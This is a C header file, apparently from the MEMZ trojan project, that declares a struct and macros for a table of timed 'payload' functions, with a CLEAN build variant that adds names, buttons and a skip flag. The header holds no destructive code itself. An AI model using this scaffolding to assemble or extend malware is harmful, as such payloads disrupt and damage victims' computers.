#pragma once
#include "memz.h"

typedef struct {
#ifdef CLEAN
	int(*payloadFunction)(int, int, BOOLEAN);
	wchar_t *name;
	HWND btn;
	int delay, times, runtime, delaytime;
	BOOLEAN safe;
#else
	int(*payloadFunction)(int, int);
	int delay;
#endif
} PAYLOAD;

#ifdef CLEAN
extern PAYLOAD payloads[];
#define PAYLOADFUNC int times, int runtime, BOOLEAN skip
#define PAYLOADHEAD if (skip) goto out;
#else
extern const PAYLOAD payloads[];
#define PAYLOADFUNC int times, int runtime
#define PAYLOADHEAD
#endif
extern const size_t nPayloads;